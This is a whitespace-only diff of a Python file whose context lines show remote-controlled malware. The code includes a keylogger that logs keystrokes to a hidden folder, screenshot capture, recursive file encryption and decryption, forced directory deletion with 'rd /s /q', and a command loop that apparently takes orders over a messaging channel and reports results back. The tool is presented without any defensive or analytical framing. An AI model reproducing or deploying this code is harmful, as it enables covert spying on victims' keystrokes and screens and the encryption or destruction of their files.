@@ -83,7 +83,6 @@ class Crypt_my10():
         dec_dt=fer.decrypt(data)
         #dec_dt=str(dec_dt)[2:-1]
         return dec_dt.decode()
-
     
     
     def encrypt_files(self,path):
@@ -95,7 +94,6 @@ class Crypt_my10():
             file.write(self.encrypt_data(data))
             if self.up_crypt==0 and inside_up_crypt !=0:
                 send_message("successfully encrypted")
-            
             
             
     def decrypt_files(self,path):
@@ -132,7 +130,6 @@ class Crypt_my10():
         send_message("files that were successfully encrypted: "+str(c))
             
             
-    
     def recursive_decrypt_files(self,path):
         self.up_crypt=1
         paths_dir=self.get_dirs(path)
@@ -149,8 +146,7 @@ class Crypt_my10():
             all_files=[]
         send_message("files that were successfully decrypted: "+str(c))
             
-            
-            
+              
     def sync_recursive_encrypt_files(self,path):
         paths_dir=self.get_dirs(path)
         size=[]
@@ -230,9 +226,7 @@ class Advanced_files_search:
             for n in all_files:
                 for j in files:
                     if j in n:
-                        res+= i+'\\'+n+'\n'
-
-                        
+                        res+= i+'\\'+n+'\n'         
         return res
         
         
@@ -261,8 +255,6 @@ class Delet_files():
                 self.sec.append(f'{str(i):<30}{"deleted!":>25}')
             else:
                 failed.append(f"{str(i):<30}{'faild!':>25}")
-            
-            
 
         for i in self.sec:
             self.to_send+=i+'\n'
@@ -271,21 +263,18 @@ class Delet_files():
         print(self.to_send)
             
             
-            
     def to_send_res(self,path):
         self.delet_files_list(path)
         if len( self.sec)>0:
             send_message(self.to_send)
-        
-        
+       
     
     def recursive_fles_delete(self,path):
         p = subprocess.Popen('rd /s /q "'+path+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         c = p.stdout.readline()
        
     
-    
-    
+   
 def screen_shot(name):
     p = subprocess.Popen("chdir C:\\proccess\\ && mkdir neercs", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     save_image_path= 'C:\\proccess\\neercs\\'+name+'.jpg'
@@ -314,8 +303,7 @@ def on_press(key):
         keys=[]
         count=0
 
-
-
+        
 def write_to_file(keys):
     with open('C:\\proccess\\process.txt','ab')as file:
         for i in keys:
@@ -324,7 +312,6 @@ def write_to_file(keys):
             file.write(b'\n')
             
             
-
 
 def capture_data():
     data=''
@@ -359,7 +346,6 @@ def capture_data():
                     s=" <Down> "
                 elif 'up' in s:
                     s=" <Up> "
-                    
                 else:
                     s=s
             
@@ -380,9 +366,7 @@ def capture_data():
     f=open('C:\\proccess\\process.txt','w')
     f.write('')
 
-
-
-
+    
 
 def read_messages():
     global offset,message_data
@@ -438,7 +422,6 @@ def start_project():
                     print(command,'0')
                     if "captur keyloger" in command:
                         capture_data()
-
                         
                     
                     elif command[:12]== "encrypt file":
@@ -491,8 +474,6 @@ def start_project():
             print(e)                            
         
        
-                
-
 def start_key_log():
     with Listener(on_press=on_press) as listener:
         listener.join()
